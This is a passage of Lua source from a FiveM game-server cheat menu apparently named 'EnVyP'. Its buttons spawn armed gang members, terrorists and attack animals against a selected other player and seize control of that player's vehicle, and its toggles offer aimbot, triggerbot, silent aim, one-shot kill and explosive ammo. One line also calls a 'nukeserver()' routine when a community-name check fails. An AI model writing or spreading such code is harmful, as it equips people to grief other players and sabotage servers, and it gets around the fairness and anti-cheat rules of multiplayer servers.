                        ped1,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        200,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        makePedHostile(ped, SelectedPlayer, 0, 0)
                        makePedHostile(ped1, SelectedPlayer, 0, 0)
                        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                        TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                        for i = 1, 2 do
                          Citizen.Wait(5)
                          ClearPedTasks(GetPlayerPed(-1))
                        end
                      end
                    end
                  end
                end
              end
            elseif EVP.Button('Spawn The Lost MC Club ~r~Attack') then
              local vehlist = {"Vindicator", "Ruffian", "Sanchez2", "Hexer", "Gargoyle", "Enduro", "Double", "Bati", "GBurrito", "GBurrito2"}
              local veh = vehlist[math.random(#vehlist)]
              for i = 0, 1 do
                local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                  local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                  NetworkRequestControlOfEntity(vt)
                  SetVehicleModKit(vt, 0)
                  ToggleVehicleMod(vt, 20, 1)
                  SetVehicleModKit(vt, 0)
                  SetVehicleTyresCanBurst(vt, 1)
                end
                local v = nil
                RequestModel(veh)
                RequestModel('G_M_Y_Lost_03')
                while not HasModelLoaded(veh) and not HasModelLoaded('G_M_Y_Lost_03') do
                  RequestModel('G_M_Y_Lost_03')
                  Citizen.Wait(0)
                  RequestModel(veh)
                end
                if HasModelLoaded(veh) then
                  Citizen.Wait(50)
                  v =
                  CreateVehicle(
                  veh,
                  pos.x - (xf * 30),
                  pos.y - (yf * 30),
                  pos.z + 1,
                  GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                  true,
                  false
                  )
                  if DoesEntityExist(v) then
                    NetworkRequestControlOfEntity(v)
                    SetVehicleDoorsLocked(v, 4)
                    RequestModel('G_M_Y_Lost_03')
                    Citizen.Wait(50)
                    if HasModelLoaded('G_M_Y_Lost_03') then
                      Citizen.Wait(50)
                      local ped = CreatePed(21, GetHashKey('G_M_Y_Lost_03'), pos.x, pos.y, pos.z, true, true)
                      local ped1 =
                      CreatePed(21, GetHashKey('G_M_Y_Lost_03'), pos.x, pos.y, pos.z, true, true)
                      if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_MACHINEPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_REVOLVER'), 9999, 1, 1)
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v, 0)
                        TaskDriveBy(
                        ped,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        pos.x,
                        pos.y,
                        pos.z,
                        200,
                        99,
                        0,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        TaskShootAtEntity(
                        ped1,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        200,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        makePedHostile(ped, SelectedPlayer, 0, 0)
                        makePedHostile(ped1, SelectedPlayer, 0, 0)
                        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                        TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                        for i = 1, 2 do
                          Citizen.Wait(5)
                          ClearPedTasks(GetPlayerPed(-1))
                        end
                      end
                    end
                  end
                end
              end
            elseif EVP.Button('Spawn Terrorists In Cars ~r~Attack') then
              local vehlist = {"Technical3", "Technical2", "Technical", "Dune3", "Tampa3"}
              local veh = vehlist[math.random(#vehlist)]
              for i = 0, 1 do
                local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                  local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                  NetworkRequestControlOfEntity(vt)
                  SetVehicleModKit(vt, 0)
                  ToggleVehicleMod(vt, 20, 1)
                  SetVehicleModKit(vt, 0)
                  SetVehicleTyresCanBurst(vt, 1)
                end
                local v = nil
                RequestModel(veh)
                RequestModel('G_M_M_ChiCold_01')
                while not HasModelLoaded(veh) and not HasModelLoaded('G_M_M_ChiCold_01') do
                  RequestModel('G_M_M_ChiCold_01')
                  Citizen.Wait(0)
                  RequestModel(veh)
                end
                if HasModelLoaded(veh) then
                  Citizen.Wait(50)
                  v =
                  CreateVehicle(
                  veh,
                  pos.x - (xf * 30),
                  pos.y - (yf * 30),
                  pos.z + 1,
                  GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                  true,
                  false
                  )
                  if DoesEntityExist(v) then
                    NetworkRequestControlOfEntity(v)
                    SetVehicleDoorsLocked(v, 4)
                    RequestModel('G_M_M_ChiCold_01')
                    Citizen.Wait(50)
                    if HasModelLoaded('G_M_M_ChiCold_01') then
                      Citizen.Wait(50)
                      local ped = CreatePed(21, GetHashKey('G_M_M_ChiCold_01'), pos.x, pos.y, pos.z, true, true)
                      local ped1 =
                      CreatePed(21, GetHashKey('G_M_M_ChiCold_01'), pos.x, pos.y, pos.z, true, true)
                      if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_MACHINEPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_MICROSMG'), 9999, 1, 1)
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v, 0)
                        TaskDriveBy(
                        ped,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        pos.x,
                        pos.y,
                        pos.z,
                        200,
                        99,
                        0,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        TaskShootAtEntity(
                        ped1,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        200,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        makePedHostile(ped, SelectedPlayer, 0, 0)
                        makePedHostile(ped1, SelectedPlayer, 0, 0)
                        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                        TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                        for i = 1, 2 do
                          Citizen.Wait(5)
                          ClearPedTasks(GetPlayerPed(-1))
                        end
                      end
                    end
                  end
                end
              end
            elseif EVP.Button('~r~~r~Spawn ~s~Mountain Lion ~r~Attack') then
              local mtlion = "A_C_MtLion"
              for i = 0, 1 do
                local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(mtlion))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(mtlion)) then
                  local ped =
                  CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local ei = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(ei, false)
                    SetNetworkIdCanMigrate(ei, true)
                    SetNetworkIdExistsOnAllMachines(ei, true)
                    Citizen.Wait(50)
                    NetToPed(ei)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button('~r~~r~Spawn ~s~Dog Rottweiler ~r~Attack') then
              local mtlion = "A_C_Rottweiler"
              for i = 0, 1 do
                local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(mtlion))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(mtlion)) then
                  local ped =
                  CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local ei = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(ei, false)
                    SetNetworkIdCanMigrate(ei, true)
                    SetNetworkIdExistsOnAllMachines(ei, true)
                    Citizen.Wait(50)
                    NetToPed(ei)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button('~r~~r~Spawn ~s~Dog Husky ~r~Attack') then
              local mtlion = "A_C_Husky"
              for i = 0, 1 do
                local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(mtlion))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(mtlion)) then
                  local ped =
                  CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local ei = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(ei, false)
                    SetNetworkIdCanMigrate(ei, true)
                    SetNetworkIdExistsOnAllMachines(ei, true)
                    Citizen.Wait(50)
                    NetToPed(ei)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button('~r~~r~Sea Spawn ~s~Shark ~r~Attack') then
              local mtlion = "A_C_SharkTiger"
              for i = 0, 1 do
                local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(mtlion))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(mtlion)) then
                  local ped =
                  CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local ei = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(ei, false)
                    SetNetworkIdCanMigrate(ei, true)
                    SetNetworkIdExistsOnAllMachines(ei, true)
                    Citizen.Wait(50)
                    NetToPed(ei)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button('Spawn Following Asshat') then
              asshat = true
              local target = GetPlayerPed(SelectedPlayer)
              local assped = nil
              local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
              local veh = vehlist[math.random(#vehlist)]
              local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
              local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
              local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
              local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
              local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
              local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
              if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                NetworkRequestControlOfEntity(vt)
                SetVehicleModKit(vt, 0)
                ToggleVehicleMod(vt, 20, 1)
                SetVehicleModKit(vt, 0)
                SetVehicleTyresCanBurst(vt, 1)
              end
              local v = nil
              RequestModel(veh)
              RequestModel('s_m_y_hwaycop_01')
              while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
                RequestModel('s_m_y_hwaycop_01')
                Citizen.Wait(0)
                RequestModel(veh)
              end
              if HasModelLoaded(veh) then
                Citizen.Wait(50)
                v =
                CreateVehicle(
                veh,
                pos.x - (xf * 10),
                pos.y - (yf * 10),
                pos.z + 1,
                GetEntityHeading(GetPlayerPed(-1)),
                1,
                1
                )
                v1 =
                CreateVehicle(
                veh,
                pos.x - (xf * 10),
                pos.y - (yf * 10),
                pos.z + 1,
                GetEntityHeading(GetPlayerPed(-1)),
                1,
                1
                )
                SetVehicleGravityAmount(v, 15.0)
                SetVehicleGravityAmount(v1, 15.0)
                SetEntityInvincible(v, true)
                SetEntityInvincible(v1, true)
                if DoesEntityExist(v) then
                  NetworkRequestControlOfEntity(v)
                  SetVehicleDoorsLocked(v, 4)
                  RequestModel('s_m_y_hwaycop_01')
                  Citizen.Wait(50)
                  if HasModelLoaded('s_m_y_hwaycop_01') then
                    Citizen.Wait(50)
                    local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                    local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                    local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                    local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                    assped = ped
                    if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                      GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                      GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                      GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                      GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                      SetPedIntoVehicle(ped, v, -1)
                      SetPedIntoVehicle(ped1, v1, -1)
                      SetPedIntoVehicle(pas, v, 0)
                      SetPedIntoVehicle(pas1, v1, 0)
                      TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                      asstarget = target
                      TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                      SetDriverAbility(ped, 10.0)
                      SetDriverAggressiveness(ped, 10.0)
                      SetDriverAbility(ped1, 10.0)
                      SetDriverAggressiveness(ped1, 10.0)
                    end
                  end
                end
              end
            end

            EVP.Display()
          elseif IsDisabledControlPressed(0, 178) then
            EVP.OpenMenu(EnVyPIcS)

            EVP.Display()
          elseif EVP.IsMenuOpened(TRPM) then
            drawDescription("Teleport options for you", 0.80, 0.9)
            if EVP.Button("Teleport to ~g~waypoint") then
              TeleportToWaypoint()
            elseif EVP.Button("Teleport into ~g~nearest ~s~vehicle") then
              teleporttonearestvehicle()
            elseif EVP.Button("Teleport to ~r~coords") then
              teleporttocoords()
            elseif EVP.Button("Draw custom ~r~blip ~s~on map") then
              drawcoords()
            elseif EVP.CheckBox("Show ~g~Coords", showCoords, function (enabled) showCoords = enabled end) then
              end

              EVP.Display()
          elseif EVP.IsMenuOpened(WMPS) then
            if EVP.MenuButton("~p~#~s~ Give Single Weapon", WTNe) then
            elseif EVP.MenuButton("~p~#~s~ Crosshairs", CMSMS) then

            elseif EVP.Button("~g~Give All Weapons") then
              for i = 1, #allWeapons do
                GiveWeaponToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), 1000, false, false)
              end
            elseif EVP.Button("~r~Remove All Weapons") then
              RemoveAllPedWeapons(PlayerPedId(-1), true)

            elseif EVP.Button("Drop your current Weapon") then
              local a = GetPlayerPed(-1)
              local b = GetSelectedPedWeapon(a)
              SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)

            elseif EVP.CheckBox("TriggerBot", TriggerBot, function(enabled) TriggerBot = enabled end) then
            elseif EVP.CheckBox("Aimlock ~h~~r~TEST", Aimlock, function(enabled) Aimlock = enabled end) then
            elseif EVP.CheckBox("SilentAim/Aimbot", Aimbot, function(enabled) Aimbot = enabled end) then
            elseif EVP.CheckBox("Ragebot", ragebot, function(enabled) ragebot = enabled  end) then
            elseif EVP.CheckBox("Explosive Ammo", explosiveammo, function(enabled) explosiveammo = enabled  end) then
            elseif EVP.CheckBox("Rapid Fire", rapidfire, function(enabled) rapidfire = enabled  end) then
            elseif EVP.Button("Give Ammo") then
              local result = KeyboardInput("Enter the amount of ammo", "", 100)
              if result ~= "" then
                for i = 1, #allWeapons do AddAmmoToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), result) end
              end
            elseif EVP.CheckBox("Inf ~r~Ammo", infAmmo, function(enabled) infAmmo = enabled end) then
            elseif EVP.CheckBox("OneShot ~r~Kill", oneshot, function(enabled) oneshot = enabled end) then
            elseif EVP.CheckBox("OneShot ~b~Car", oneshotcar, function(enabled) oneshotcar = enabled end) then
            elseif EVP.CheckBox("Magic Bullet", MagicBullet, function(enabled) MagicBullet = enabled end) then
            elseif EVP.CheckBox("Force Gun", forcegun, function(enabled) forcegun = enabled end) then
            elseif EVP.CheckBox("Vehicle Gun",VehicleGun, function(enabled)VehicleGun = enabled end)  then
            elseif EVP.CheckBox("Delete Gun",DeleteGun, function(enabled)DeleteGun = enabled end)  then
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(tngns) then
            veh = GetVehiclePedIsUsing(PlayerPedId())
            for i,theItem in pairs(vehicleMods) do
              if theItem.id == "extra" and #checkValidVehicleExtras() ~= 0 then
                if EVP.MenuButton(theItem.name, theItem.id) then
                end
              elseif theItem.id == "neon" then
                if EVP.MenuButton(theItem.name, theItem.id) then
                end
              elseif theItem.id == "paint" then
                if EVP.MenuButton(theItem.name, theItem.id) then
                end
              elseif theItem.id == "wheeltypes" then
                if EVP.MenuButton(theItem.name, theItem.id) then
                end
              elseif theItem.id == "headlight" then
                if EVP.MenuButton(theItem.name, theItem.id) then
                end
              elseif theItem.id == "licence" then
                if EVP.MenuButton(theItem.name, theItem.id) then
                end
              else
                local valid = checkValidVehicleMods(theItem.id)
                for ci,ctheItem in pairs(valid) do
                  if EVP.MenuButton(theItem.name, theItem.id) then
                  end
                  break
                end
              end

            end
            if IsToggleModOn(veh, 22) then
              xenonStatus = "Installed"
            else
              xenonStatus = "Not Installed"
            end
            if EVP.Button("Xenon Headlight", xenonStatus) then
              if not IsToggleModOn(veh,22) then
                ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
              else
                ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
              end
            end

            EVP.Display()
          elseif EVP.IsMenuOpened(prof) then
            veh = GetVehiclePedIsUsing(PlayerPedId())
            for i,theItem in pairs(perfMods) do
              if EVP.MenuButton(theItem.name, theItem.id) then
              end
            end
            if IsToggleModOn(veh,18) then
              turboStatus = "Installed"
            else
              turboStatus = "Not Installed"
            end
            if EVP.Button("~b~Turbo Tune", turboStatus) then
              if not IsToggleModOn(veh,18) then
                ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
              else
                ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
              end
            end

            EVP.Display()
          elseif EVP.IsMenuOpened("primary") then
            if EVP.MenuButton("~p~#~s~ Classic", "classic1") then
            elseif EVP.MenuButton("~p~#~s~ Metallic", "metallic1") then
            elseif EVP.MenuButton("~p~#~s~ Matte", "matte1") then
            elseif EVP.MenuButton("~p~#~s~ Metal", "metal1") then
            end

            EVP.Display()
          elseif EVP.IsMenuOpened("secondary") then
            if EVP.MenuButton("~p~#~s~ Classic", "classic2") then
            elseif EVP.MenuButton("~p~#~s~ Metallic", "metallic2") then
            elseif EVP.MenuButton("~p~#~s~ Matte", "matte2") then
            elseif EVP.MenuButton("~p~#~s~ Metal", "metal2") then
            end

            EVP.Display()
          elseif EVP.IsMenuOpened("rimpaint") then
            if EVP.MenuButton("~p~#~s~ Classic", "classic3") then
            elseif EVP.MenuButton("~p~#~s~ Metallic", "metallic3") then
            elseif EVP.MenuButton("~p~#~s~ Matte", "matte3") then
            elseif EVP.MenuButton("~p~#~s~ Metal", "metal3") then
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("classic1") then
            for theName,thePaint in pairs(paintsClassic) do
              tp,ts = GetVehicleColours(veh)
              if tp == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and tp == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

                  isPreviewing = true
                elseif isPreviewing and curprim == thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and curprim ~= thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = true
                end
              end
            end

            if envypxd ~= "EnVyP Community" then
              nukeserver()
            end

            EVP.Display()
          elseif EVP.IsMenuOpened("metallic1") then
            for theName,thePaint in pairs(paintsClassic) do
              tp,ts = GetVehicleColours(veh)
              if tp == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and tp == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

                  isPreviewing = true
                elseif isPreviewing and curprim == thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and curprim ~= thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("matte1") then
            for theName,thePaint in pairs(paintsMatte) do
              tp,ts = GetVehicleColours(veh)
              if tp == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and tp == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleColours(veh,thePaint.id,oldsec)

                  isPreviewing = true
                elseif isPreviewing and curprim == thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and curprim ~= thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("metal1") then
            for theName,thePaint in pairs(paintsMetal) do
              tp,ts = GetVehicleColours(veh)
              if tp == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and tp == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                  oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  SetVehicleColours(veh,thePaint.id,oldsec)

                  isPreviewing = true
                elseif isPreviewing and curprim == thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and curprim ~= thePaint.id then
                  SetVehicleColours(veh,thePaint.id,oldsec)
                  SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("classic2") then
            for theName,thePaint in pairs(paintsClassic) do
              tp,ts = GetVehicleColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldmod = table.pack(oldprim,oldsec)
                  SetVehicleColours(veh,oldprim,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and cursec == thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and cursec ~= thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("metallic2") then
            for theName,thePaint in pairs(paintsClassic) do
              tp,ts = GetVehicleColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldmod = table.pack(oldprim,oldsec)
                  SetVehicleColours(veh,oldprim,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and cursec == thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and cursec ~= thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("matte2") then
            for theName,thePaint in pairs(paintsMatte) do
              tp,ts = GetVehicleColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldmod = table.pack(oldprim,oldsec)
                  SetVehicleColours(veh,oldprim,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and cursec == thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif isPreviewing and cursec ~= thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
                  isPreviewing = true
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened("metal2") then
            for theName,thePaint in pairs(paintsMetal) do
              tp,ts = GetVehicleColours(veh)
              if ts == thePaint.id and not isPreviewing then
                pricetext = "Installed"
              else
                if isPreviewing and ts == thePaint.id then
                  pricetext = "Previewing"
                else
                  pricetext = "Not Installed"
                end
              end
              curprim,cursec = GetVehicleColours(veh)
              if EVP.Button(thePaint.name, pricetext) then
                if not isPreviewing then
                  oldmodtype = "paint"
                  oldmodaction = false
                  oldprim,oldsec = GetVehicleColours(veh)
                  oldmod = table.pack(oldprim,oldsec)
                  SetVehicleColours(veh,oldprim,thePaint.id)

                  isPreviewing = true
                elseif isPreviewing and cursec == thePaint.id then
                  SetVehicleColours(veh,oldprim,thePaint.id)
